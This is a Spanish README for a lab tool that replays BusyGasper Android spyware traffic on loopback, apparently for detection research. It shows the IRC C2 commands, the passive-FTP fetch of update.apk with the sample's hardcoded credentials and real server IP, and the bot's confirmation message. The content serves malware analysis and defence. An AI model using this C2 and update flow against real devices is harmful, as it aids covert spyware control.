# Emulador de tráfico BusyGasper

Este laboratorio genera tráfico real en loopback para la ruta positiva analizada de BusyGasper: canal C2 por IRC y descarga de `update.apk` por FTP pasivo tras recibir `#Uupdate.apk`.

No usa librerías de alto nivel para IRC ni FTP. Cada línea de aplicación se escribe con sockets para controlar el orden y la forma.

## Secuencia generada

La fase de la víctima genera:

```text
NICK Suny-12345
USER Suny-12345 8 * : IRC Client
:irc.freenode.net 001/002/003 ...
:irc.freenode.net 004 Suny-12345 irc.freenode.net ...
:IRCBoss!boss@lab PRIVMSG Suny-12345 :#Uupdate.apk
```

Después se abre FTP:

```text
S: 220 BusyGasper lab FTP ready
C: user ealexzna
S: 331 Password required
C: pass kl725x2408
S: 230 Login successful
C: pasv
S: 227 Entering Passive Mode (127,0,0,1,78,232)
```

La víctima abre el socket TCP de datos indicado por `227`. En el puerto por defecto, `78 * 256 + 232 = 20200`.

Tras abrir ese socket de datos, la clase FTP interna de BusyGasper continúa así:

```text
C: type i
S: 200 Type set to I
C: retr update.apk
S: 150 Opening BINARY mode data connection for update.apk
D: bytes de update.apk por el socket TCP de datos
S: 226 Transfer complete
C: quit
S: 221 Goodbye
```

Finalmente, la víctima responde por IRC:

```text
PRIVMSG IRCBoss :com.android.system.bdata updated
```

## Ejecución con CoreDNS

Arranca CoreDNS con el `Corefile` de esta carpeta. La víctima emulada consulta `irc.freenode.net` mediante una petición DNS UDP real contra `127.0.0.1:53`; no depende del resolvedor de Windows ni hace fallback hacia Internet si CoreDNS no responde.

```powershell
coredns -conf Corefile
python run_emulation.py
```

Puertos usados:

| Protocolo | Puerto |
| --- | --- |
| DNS | `53/udp` |
| IRC | `6667/tcp` |
| FTP control | `21/tcp` |
| FTP datos pasivo | `20200/tcp` |

El FTP de la muestra usa por defecto `213.174.157.151`, que es una IP literal y no pasa por DNS. Para trabajar completamente en loopback, el emulador usa `127.0.0.1` como `fhost` de laboratorio.

## Prueba sin CoreDNS

Para probar solo la conversación de aplicación sin generar DNS, fuerza también IRC a loopback:

```powershell
python run_emulation.py --irc-connect-host 127.0.0.1
```
